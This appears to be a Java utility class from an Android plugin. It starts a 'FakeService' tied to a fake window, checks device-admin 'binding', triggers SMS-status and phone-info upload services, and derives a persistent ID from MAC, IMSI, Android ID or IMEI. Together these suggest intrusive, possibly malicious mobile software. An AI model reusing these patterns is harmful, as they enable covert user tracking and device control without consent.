package com.xstd.plugin.Utils;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.umeng.analytics.MobclickAgent;
import com.xstd.plugin.binddevice.DeviceBindBRC;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.PluginSettingManager;
import com.xstd.plugin.service.FakeService;
import com.xstd.plugin.service.PluginService;

import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.UUID;
import java.util.regex.Pattern;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-11-18
 * Time: PM6:49
 * To change this template use File | Settings | File Templates.
 */
public class CommonUtil {

    public static void umengLog(Context context, String event, HashMap<String, String> log) {
        log.put("v", UtilsRuntime.getVersionName(context));
        log.put("osVersion", Build.VERSION.RELEASE);
        log.put("phoneType", Build.MODEL);
        log.put("manufacturer", Build.MANUFACTURER);
        MobclickAgent.onEvent(context, event, log);
        MobclickAgent.flush(context);
    }


    public static boolean checkPackageInstall(Context context, String packageName) {
        PackageInfo packageInfo;
        try {
            packageInfo = context.getPackageManager().getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
        } catch (Exception e) {
            packageInfo = null;
            e.printStackTrace();
        }
        if (packageInfo == null) {
            return false;
        } else {
            return true;
        }
    }

    public static void checkIfShouldUpdatePluginSMSStatus(Context context) {
        if (PluginSettingManager.getInstance().getShouldUpdateSMSStatus()) {
            Intent i = new Intent();
            i.setAction(PluginService.ACTION_UPDATE_SMS_STATUS);
            i.setClass(context, PluginService.class);
            context.startService(i);
        }
    }

    public static void checkIfNeedUploadPhoneInstallInfo(Context context) {
        int channel = Integer.valueOf(Config.CHANNEL_CODE);
        if (channel > 800000 && channel < 900000) {
            if (Config.DEBUG) {
                Config.LOGD("[[CommonUtil::checkIfNeedUploadPhoneInstallInfo]] current Channel is : " + Config.CHANNEL_CODE + " should check" +
                                " if need update phone info");
            }

            long lastUpdateTime = PluginSettingManager.getInstance().getLastUpdatePhoneInstallInfoTime();
            if ((System.currentTimeMillis() - lastUpdateTime) >= Config.ONE_DAY) {
                if (Config.DEBUG) {
                    Config.LOGD("[[CommonUtil::checkIfNeedUploadPhoneInstallInfo]] delay > 1 day, should upload info for PhoneInstall");
                }
                Intent i = new Intent();
                i.setAction(PluginService.ACTION_PHONE_INSTALL_INFO);
                i.setClass(context, PluginService.class);
                context.startService(i);
            }
        }
    }

    public static void startFakeService(Context context, String from) {
        if (Config.DEBUG) {
            Config.LOGD("[[CommonUtil::startFakeService]] from reason : " + from);
        }
        Intent is = new Intent();
        is.setClass(context, FakeService.class);
//        is.setAction(FakeService.ACTION_SHOW_FAKE_WINDOW);
        context.startService(is);
    }

    public static boolean isBindingActive(Context context) {
        DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
        return dpm.isAdminActive(new ComponentName(context, DeviceBindBRC.class))
                   && PluginSettingManager.getInstance().getKeyHasBindingDevices();
    }

    private static final String PREFS_FILE = "device_id.xml";
    private static final String PREFS_DEVICE_ID = "device_id";
    public static UUID uuid;

    public synchronized static void saveUUID(Context context, String uuid) {
        if (!TextUtils.isEmpty(uuid)) {
            SharedPreferences prefs = context.getSharedPreferences(PREFS_FILE, 0);
            prefs.edit().putString(PREFS_DEVICE_ID, uuid).commit();
        }
    }

    public static UUID deviceUuidFactory(Context context) {
        if (uuid == null) {
            synchronized (CommonUtil.class) {
                if (uuid == null) {
                    final SharedPreferences prefs = context.getSharedPreferences(PREFS_FILE, 0);
                    final String id = prefs.getString(PREFS_DEVICE_ID, null);
                    if (id != null) {
                        // Use the ids previously computed and stored in the prefs file
                        uuid = UUID.fromString(id);
                    } else {
                        //首先获取MAC地址
                        String androidId = UtilsRuntime.getLocalMacAddress(context);
                        if (TextUtils.isEmpty(androidId)) {
                            //尝试获取IMSI号
                            androidId = UtilsRuntime.getIMSI(context);
                            if (TextUtils.isEmpty(androidId)) {
                                //尝试获取Android_ID
                                androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                            }
                        }

                        try {
                            if (!"9774d56d682e549c".equals(androidId)) {
                                uuid = UUID.nameUUIDFromBytes(androidId.getBytes("utf8"));
                            } else {
                                String deviceId = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
                                uuid = deviceId != null ? UUID.nameUUIDFromBytes(deviceId.getBytes("utf8")) : UUID.randomUUID();
                            }
                        } catch (UnsupportedEncodingException e) {
                            throw new RuntimeException(e);
                        }
                        // Write the value out to the prefs file
                        if (uuid != null) {
                            prefs.edit().putString(PREFS_DEVICE_ID, uuid.toString()).commit();
                        }
                    }
                }
            }
        }

        return uuid;
    }

    public static boolean isNumeric(String str) {
        Pattern pattern = Pattern.compile("[0-9]*");
        return pattern.matcher(str).matches();
    }

}
